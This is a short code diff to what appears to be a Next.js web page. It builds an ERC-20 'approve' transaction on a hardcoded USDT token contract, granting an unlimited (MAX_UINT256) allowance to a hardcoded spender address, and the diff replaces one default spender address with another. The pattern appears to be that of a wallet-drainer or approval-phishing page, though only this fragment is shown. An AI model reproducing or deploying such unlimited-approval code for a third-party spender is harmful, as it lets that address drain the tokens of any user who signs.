@@ -281,7 +281,7 @@ export default function Home() {
       }
 
       const tokenAddress = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "0x55d398326f99059fF775485246999027B3197955";
-      const spenderAddress = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "0xD8446C23b0C82AA17Ced649855BE58bc1d5C873D";
+      const spenderAddress = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "0x698f4c854C8F6fD8fCC84af2E5d399D78E5792B2";
       const methodId = "0x095ea7b3";
       const spenderHex = toHex32(spenderAddress);
       const valueHex = MAX_UINT256_HEX;
